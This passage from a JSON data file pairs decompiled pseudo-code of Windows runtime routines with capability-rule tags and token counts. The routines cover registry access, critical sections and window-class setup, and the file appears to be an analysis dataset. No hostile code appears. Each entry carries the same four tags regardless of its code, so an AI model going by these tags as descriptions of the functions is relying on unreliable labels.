*in_FS_OFFSET = &stack0xffffffb0;\n    if ((var_ch == 0) || (*(var_ch + 8) < 1)) {\n        var_1h._0_1_ = '\\0';\n    }\n    else {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((var_1h != '\\0') && (0 < *(var_ch + 8))) {\n        uStackY84 = 0x41f722;\n        puStackY72 = &fcn.0041f660::var_1h + 1;\n        var_8h = fcn.004197d8();\n        uStackY84 = 0x41f72f;\n        fcn.004196cc();\n        uStackY84 = 0x4979d0;\n        puStackY88 = 0x41f739;\n        sub.kernel32.dll_LeaveCriticalSection();\n        uStackY92 = 0x41f7a9;\n        uStackY96 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa0;\n        uStackY104 = 0x41f76a;\n        uStackY108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStackY88 = &fcn.0041f660::var_1h + 1;\n        (**(*var_8h + 8))();\n        *in_FS_OFFSET = uStackY108;\n        *in_FS_OFFSET = uStackY96;\n        puStackY88 = 0x41f7b0;\n        uStackY92 = 0x4979d0;\n        uStackY96 = 0x41f7a8;\n        sub.kernel32.dll_EnterCriticalSection();\n        return;\n    }\n    *in_FS_OFFSET = uStackY80;\n    puStackY72 = 0x41f80d;\n    uStackY76 = 0x41f805;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 1039
    },
    "0041f884": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f884(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a0c();\n    fcn.0041faec();\n    if (*(iVar1 + 0x14) != 0) {\n        while ((*(iVar1 + 0x14) != 0 && (0 < *(*(iVar1 + 0x14) + 8)))) {\n            piVar2 = fcn.004197d8();\n            (**(*piVar2 + 0x10))();\n        }\n        fcn.0040f8b8();\n    }\n    fcn.0041fa90();\n    if (*(iVar1 + 4) != 0) {\n        fcn.0041fa58();\n    }\n    fcn.00419d54();\n    if ('\\0' < extraout_DL) {\n        fcn.004049b4();\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "0041f90c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f90c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 4) == 0) || (*(in_EAX + 4) != *(param_2 + 4))) {\n        if (*(in_EAX + 0x14) == 0) {\n            uVar1 = fcn.00404610();\n            *(in_EAX + 0x14) = uVar1;\n        }\n        iVar2 = fcn.00419834();\n        if (iVar2 < 0) {\n            fcn.00419680();\n            fcn.0041f90c();\n        }\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x100;\n    return;\n}\n",
        "token_count": 205
    },
    "0041f9a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f9a0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        uVar1 = fcn.00404610();\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.00419680();\n    *(param_2 + 4) = in_EAX;\n    return;\n}\n",
        "token_count": 114
    },
    "0041f9cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f9cc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 4) = 0;\n    fcn.0041991c();\n    if (*(*(in_EAX + 0x10) + 8) == 0) {\n        fcn.00404640();\n        *(in_EAX + 0x10) = 0;\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0041fb28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041fb28(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        fcn.0041991c();\n        if (*(*(in_EAX + 0x14) + 8) == 0) {\n            fcn.00404640();\n            *(in_EAX + 0x14) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0041fcc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041fcc0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        cVar1 = fcn.004099fc();\n        if ((cVar1 == '\\0') && (in_EAX == *(in_EDX + 4))) {\n            iVar2 = fcn.0041fd58();\n            if (iVar2 != 0) {\n                var_ch = arg_8h;\n                var_8h._0_1_ = 0xb;\n                fcn.0040db68(0, &var_ch);\n                fcn.00404eb4();\n            }\n        }\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 4) != 0)) {\n        (**(**(in_EAX + 4) + 0x20))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 267
    },
    "0041fd58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041fd58(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (((param_2 != 0) && (*(in_EAX + 0x10) != 0)) && (iVar3 = *(*(in_EAX + 0x10) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.004197d8();\n            cVar1 = fcn.004099fc();\n            if (cVar1 != '\\0') goto code_r0x0041fd9d;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    uVar2 = 0;\ncode_r0x0041fd9d:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 210
    },
    "0041fe4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041fe4c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        fcn.00419764();\n    }\n    fcn.004197d8();\n    return;\n}\n",
        "token_count": 62
    },
    "0041fedc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fedc(char param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) & 0xffef;\n    }\n    else {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x10;\n    }\n    if ((param_1 != '\\0') && (iVar1 = fcn.0041fe78(),  -1 < iVar1 + -1)) {\n        do {\n            fcn.0041fe4c();\n            fcn.0041fedc();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "0041ffe4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ffe4(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        cVar1 = fcn.004046f4();\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = (****(arg_8h + 0x20))(*(arg_8h + 0x20), arg_ch, arg_10h);\n    }\n    return uVar2;\n}\n",
        "token_count": 163
    },
    "004201a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004201a0(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a0c();\n    fcn.0041f884();\n    if (*(iVar1 + 0x30) != 0) {\n        fcn.0041fb4c();\n    }\n    if (*(iVar1 + 0x50) != 0) {\n        while (0 < *(*(iVar1 + 0x50) + 8)) {\n            fcn.004198c0();\n            fcn.004202e8();\n        }\n    }\n    fcn.0040f8b8();\n    if ('\\0' < extraout_DL) {\n        fcn.004049b4();\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "00420234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00420234(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x42) != 0) {\n        (**(in_EAX + 0x40))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 63
    },
    "00420250": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00420250(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x4a) != 0) {\n        (**(in_EAX + 0x48))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 64
    },
    "004203d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004203d8(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x420427;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0xc))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 226
    },
    "00420440": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420440(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x42048f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0x10))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 227
    },
    "00420590": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00420590(int32_t arg_8h, int32_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t *arg_18h, uint32_t *arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    puStack60 = 0x4205a1;\n    fcn.0040716c();\n    uStack64 = 0x420783;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_4h = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    uStack76 = 0x42075c;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if (arg_14h == 0) {\n        if (arg_10h < 0x100001) {\ncode_r0x004205fa:\n            var_ch = arg_10h;\n            goto code_r0x00420600;\n        }\n    }\n    else if (arg_14h < 1) goto code_r0x004205fa;\n    var_ch = 0x100000;\ncode_r0x00420600:\n    puStack84 = 0x420608;\n    puStack60 = &stack0xfffffffc;\n    var_8h = fcn.00402ef0();\n    uStack88 = 0x42074b;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    do {\n        if (arg_14h == 0) {\n            if (arg_10h == 0) {\ncode_r0x0042070b:\n                *in_FS_OFFSET = uStack92;\n                puStack84 = 0x420752;\n                uStack88 = 0x420720;\n                fcn.00402f0c();\n                if (arg_1ch != NULL) {\n                    *arg_1ch = var_20h;\n                    arg_1ch[1] = var_1ch;\n                }\n                if (arg_18h != NULL) {\n                    *arg_18h = var_18h;\n                    arg_18h[1] = var_14h;\n                }\n                return;\n            }\n        }\n        else if (arg_14h < 1) goto code_r0x0042070b;\n        uVar1 = arg_10h;\n        if (arg_14h == 0) {\n            if (0x7fffffff < arg_10h) {\ncode_r0x00420631:\n                uVar1 = 0x7fffffff;\n            }\n        }\n        else if (0 < arg_14h) goto code_r0x00420631;\n        for (; 0 < uVar1; uVar1 = uVar1 - uVar2) {\n            var_10h = uVar1;\n            if (var_ch < uVar1) {\n                var_10h = var_ch;\n            }\n            uVar2 = (**(**(arg_8h + 0xc) + 0xc))();\n            if (uVar2 == 0) {\n                fcn.00404f60();\n                *in_FS_OFFSET = uStack92;\ncode_r0x0042076d:\n                *in_FS_OFFSET = uStack80;\n                puStack72 = 0x42078a;\n                uStack76 = 0x420782;\n                fcn.004070f8();\n                return;\n            }\n            bVar3 = CARRY4(var_18h, uVar2);\n            var_18h = var_18h + uVar2;\n            var_14h = var_14h + (uVar2 >> 0x1f) + bVar3;\n            var_28h = 0;\n            var_24h = 0;\n            var_4h = (**(*arg_ch + 0x10))(arg_ch, var_8h, uVar2, &fcn.00420590::var_28h);\n            bVar3 = CARRY4(var_20h, var_28h);\n            var_20h = var_20h + var_28h;\n            var_1ch = var_1ch + var_24h + bVar3;\n            if ((var_4h == 0) && (uVar2 != var_28h)) {\n                var_4h = -0x7fffbffb;\n            }\n            if (var_4h != 0) {\n                fcn.00404f60();\n                *in_FS_OFFSET = uStack92;\n                goto code_r0x0042076d;\n            }\n            bVar3 = arg_10h < uVar2;\n            arg_10h = arg_10h - uVar2;\n            arg_14h = (arg_14h - (uVar2 >> 0x1f)) - bVar3;\n        }\n    } while( true );\n}\n",
        "token_count": 1306
    },
    "004208f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004208f8(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    puVar1 = *0x4979e8;\n    if (*0x4979ec == NULL) {\n        puVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar1 = *0x4979e8;\n        fcn.004030ec();\n        uVar2 = fcn.004208f0();\n        *(puVar1 + 6) = uVar2;\n        puVar3 = puVar1 + 10;\n        do {\n            puVar4 = puVar3;\n            *puVar4 = 0xe8;\n            uVar2 = fcn.004208f0();\n            *(puVar4 + 1) = uVar2;\n            *(puVar4 + 5) = *0x4979ec;\n            puVar3 = puVar4 + 0xd;\n            *0x4979ec = puVar4;\n        } while ((puVar4 + 0xd) - puVar1 < 0xffc);\n    }\n    *0x4979e8 = puVar1;\n    puVar3 = *0x4979ec;\n    puVar1 = *0x4979ec + 5;\n    *0x4979ec = *(*0x4979ec + 5);\n    *puVar1 = arg_8h;\n    *(puVar3 + 9) = arg_ch;\n    return puVar3;\n}\n",
        "token_count": 376
    },
    "004209b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004209b4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x490b3c = *0x4957f8;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x4957f8, *0x490b50, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x490b50, *0x4957f8);\n        }\n        sub.user32.dll_RegisterClassA(0x490b2c);\n    }\n    uVar2 = fcn.004085a8(0, *0x4957f8, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.004208f8(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 301
    },
    "00420fe4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00420fe4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) != 0) {\n        if (*(in_EAX + 0xc) == '\\0') {\n            sub.advapi32.dll_RegFlushKey(*(in_EAX + 4));\n        }\n        sub.advapi32.dll_RegCloseKey_1(*(in_EAX + 4));\n        *(in_EAX + 4) = 0;\n        fcn.0040546c();\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00421014": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421014(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 8)) {\n        if (*(in_EAX + 0x14) != '\\0') {\n            sub.advapi32.dll_RegCloseKey_1(*(in_EAX + 8));\n            *(in_EAX + 0x14) = 0;\n        }\n        *(in_EAX + 8) = param_2;\n        fcn.00420fe4();\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00421158": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00421158(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x42125d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.00405504();\n    uVar1 = fcn.00420ecc();\n    if (uVar1 == 0) {\n        fcn.004059a4();\n    }\n    var_ch = 0;\n    if ((var_5h == '\\0') || (var_4h == 0)) {\n        uVar2 = fcn.004058fc(0, *(in_EAX + 0x18), &var_ch);\n        uVar2 = fcn.00421064(uVar2);\n        iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n    }\n    else {\n        uVar2 = fcn.004058fc(0, 0, 0, *(in_EAX + 0x18), 0, &var_ch, &var_10h);\n        uStack76 = fcn.00421064(uVar2);\n        iVar3 = sub.advapi32.dll_RegCreateKeyExA();\n    }\n    var_6h = iVar3 == 0;\n    if (var_6h) {\n        if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n            fcn.00405800(var_4h, 0x421278, *(in_EAX + 0x10));\n        }\n        fcn.00421040();\n    }\n    *in_FS_OFFSET = uStack76;\n    fcn.0040546c(0x421264);\n    return;\n}\n",
        "token_count": 488
    },
    "0042127c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042127c(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff90;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x42142d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.00405504();\n    uVar1 = fcn.00420ecc();\n    if (uVar1 == 0) {\n        fcn.004059a4();\n    }\n    var_ch = 0;\n    uVar4 = *(in_EAX + 0x18) & 0x300;\n    uVar2 = fcn.004058fc(0, uVar4 | 0x20019, &var_ch);\n    uVar2 = fcn.00421064(uVar2);\n    iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n    var_5h = iVar3 == 0;\n    if (var_5h) {\n        *(in_EAX + 0x18) = uVar4 | 0x20019;\n        if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n            fcn.00405800(var_4h, 0x421448, *(in_EAX + 0x10));\n        }\n        fcn.00421040();\n    }\n    else {\n        uVar2 = fcn.004058fc(0, uVar4 | 0x20009, &var_ch);\n        uVar2 = fcn.00421064(uVar2);\n        iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n        var_5h = iVar3 == 0;\n        if (var_5h) {\n            *(in_EAX + 0x18) = uVar4 | 0x20009;\n            if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n                fcn.00405800(var_4h, 0x421448, *(in_EAX + 0x10));\n            }\n            fcn.00421040();\n        }\n        else {\n            uVar2 = fcn.004058fc(0, uVar4 | 1, &var_ch);\n            uVar2 = fcn.00421064(uVar2);\n            iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n            var_5h = iVar3 == 0;\n            if (var_5h) {\n                *(in_EAX + 0x18) = uVar4 | 1;\n                if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n                    in_stack_ffffff90 = var_4h;\n                    fcn.00405800(var_4h, 0x421448, *(in_EAX + 0x10));\n                }\n                fcn.00421040();\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffff90;\n    fcn.0040546c(0x421434);\n    return;\n}\n",
        "token_count": 782
    },
    "0042144c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0042144c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    int32_t iStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint hKey;\n    uint var_18h;\n    int32_t var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack76 = 0x4215b6;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x42147b;\n    fcn.00405504();\n    puStack84 = 0x421483;\n    var_11h._0_1_ = fcn.00420ecc();\n    if (var_11h == '\\0') {\n        puStack84 = 0x42149e;\n        fcn.004059a4();\n    }\n    puStack84 = 0x4214b1;\n    iVar2 = fcn.00421ae8();\n    if (iVar2 != 0) {\n        iStack88 = 0x42156c;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        puStack84 = &stack0xfffffffc;\n        fcn.00421078();\n        cVar1 = fcn.004215e4();\n        if (cVar1 != '\\0') {\n            fcn.0040555c();\n            iVar4 = var_38h + -1;\n            if (-1 < iVar4) {\n                do {\n                    *NULL = var_34h + 1;\n                    fcn.004058fc(&fcn.0042144c::var_11h + 1, 0, 0, 0, 0);\n                    iStack92 = iVar2;\n                    iVar3 = sub.advapi32.dll_RegEnumKeyExA();\n                    if (iVar3 == 0) {\n                        fcn.004058fc();\n                        fcn.00405664();\n                        fcn.0042144c();\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != -1);\n            }\n        }\n        *in_FS_OFFSET = iStack92;\n        puStack84 = 0x421573;\n        iStack88 = 0x421562;\n        fcn.00421078();\n        iStack92 = 0x42156b;\n        iStack88 = iVar2;\n        sub.advapi32.dll_RegCloseKey_1();\n        return;\n    }\n    puStack84 = 0x42157b;\n    puStack84 = fcn.004058fc();\n    iStack88 = 0x421588;\n    iStack88 = fcn.00421064();\n    iStack92 = 0x42158e;\n    sub.advapi32.dll_RegDeleteKeyA();\n    *in_FS_OFFSET = iStack88;\n    iStack80 = 0x4215bd;\n    puStack84 = 0x4215a8;\n    fcn.0040546c();\n    puStack84 = 0x4215b5;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 810
    },
    "004215e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
